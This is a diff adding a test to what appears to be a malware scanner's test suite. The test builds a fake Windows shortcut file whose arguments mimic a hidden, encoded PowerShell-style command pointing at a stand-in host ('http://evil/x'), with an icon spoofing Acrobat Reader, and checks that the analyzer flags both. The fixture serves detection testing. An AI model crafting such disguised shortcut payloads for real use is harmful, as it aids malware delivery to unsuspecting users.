@@ -437,3 +437,26 @@ def test_pcap_tls_sni_extraction(tmp_path):
     assert any("TLS SNI" in f.title for f in fnds)
     assert any("evil-tls-c2.xyz" in f.data.get("sni", []) for f in fnds
                if f.data.get("sni"))
+
+
+def test_lnk_structured_args_and_icon_spoof(tmp_path):
+    import struct
+    from hawkscan.analyzers.lnk_analyzer import LnkAnalyzer
+    flags = 0x20 | 0x40 | 0x80  # args + icon + unicode
+    hdr = bytearray(76)
+    hdr[0:4] = (76).to_bytes(4, "little")
+    hdr[4:20] = bytes([0x01, 0x14, 0x02, 0, 0, 0, 0, 0, 0xC0, 0, 0, 0, 0, 0, 0, 0x46])
+    struct.pack_into("<I", hdr, 20, flags)
+    args = "-w hidden -nop -enc SQBFAFgA http://evil/x"
+    icon = "C:\Windows\System32\AcroRd32.dll,0"
+    data = bytes(hdr)
+    data += struct.pack("<H", len(args)) + args.encode("utf-16le")
+    data += struct.pack("<H", len(icon)) + icon.encode("utf-16le")
+    ctx = _ctx(tmp_path, "x.lnk", data)
+    assert ctx.info.file_type == "lnk"
+    fnds = list(LnkAnalyzer().analyze(ctx))
+    titles = [f.title for f in fnds]
+    assert any("command interpreter" in t for t in titles)
+    assert any("Icon spoofing" in t for t in titles)
+    assert any(f.data.get("lnk_args", "").startswith("-w hidden") for f in fnds
+               if f.data.get("lnk_args"))
